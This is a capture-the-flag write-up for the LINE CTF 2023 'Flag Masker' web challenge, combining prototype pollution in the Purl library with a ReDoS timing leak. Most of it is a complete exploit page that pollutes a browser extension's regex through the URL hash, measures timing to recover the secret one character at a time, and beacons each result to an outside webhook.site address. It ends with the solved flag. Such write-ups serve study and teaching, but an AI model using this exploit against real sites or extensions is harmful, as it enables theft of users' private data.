# LINE CTF 2023 - Web - Flag Masker

1. OSINT phase: Prototype Pollution
    - By googling, I found [Purl](https://github.com/allmarkedup/purl), which is used in a minified code `dist/bot/extension/content.js`.
    - This library has a Prototype Pollution vulnerability.
        - ref. https://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/purl.md
2. Exploit phase: XS-Leak with ReDoS
    - By Prototype Pollution, we can pollute `n.regex` in `dist/bot/extension/worker.js`.
    - I leaked the bot's memo (flag) with ReDoS:
        - ReDoS payload: `(?=${prefix}).*.*.*.*.*.*.*.*!`
        - See the following HTMLs.

`index.html`:
```html
<body>
  <script>
    const HOOK_URL = "https://webhook.site/xxxxxxxxxx";

    const BASE_URL = "http://web:8000";
    const CHARS = "0123456789abcdef";
    const LEN = 32;

    const sleep = (msecs) => new Promise((r) => setTimeout(r, msecs));

    const measure = async (url) => {
      const w1 = open(url);
      await sleep(100);

      const start = performance.now();

      const w2 = open(location.origin + "/x.html");
      while (true) {
        try {
          await sleep(10);
          if (
            w2.document.body.innerHTML.includes(
              "DETECTED FLAGS ARE MASKED BY EXTENSION"
            )
          ) {
            break;
          }
        } catch (e) {}
      }

      const time = performance.now() - start;
      w2.close();
      w1.close();

      return time;
    };

    const leak = async (prefix) => {
      let maxT = 0;
      let maxC = null;
      for (const c of CHARS) {
        const url = `${BASE_URL}#__proto__[config]=${JSON.stringify({
          regex: `(?=${prefix + c}).*.*.*.*.*.*.*.*!`,
        })}`;
        const t = await measure(url);
        if (t > maxT) {
          maxT = t;
          maxC = c;
        }
      }
      return maxC;
    };

    const main = async () => {
      navigator.sendBeacon(HOOK_URL, "start");

      let known = "LINECTF{" + location.hash.slice(1);
      for (let i = 0; known.length < "LINECTF{".length + LEN; i++) {
        known += await leak(known);
        navigator.sendBeacon(HOOK_URL, known);
      }
      known += "}";
      navigator.sendBeacon(HOOK_URL, "flag: " + known);
    };
    main();
  </script>
</body>
```

`x.html`:
```html
<body>LINECTF{x}</body>
```

## Flag

```
LINECTF{e1930b4927e6b6d92d120c7c1bba3421}
```
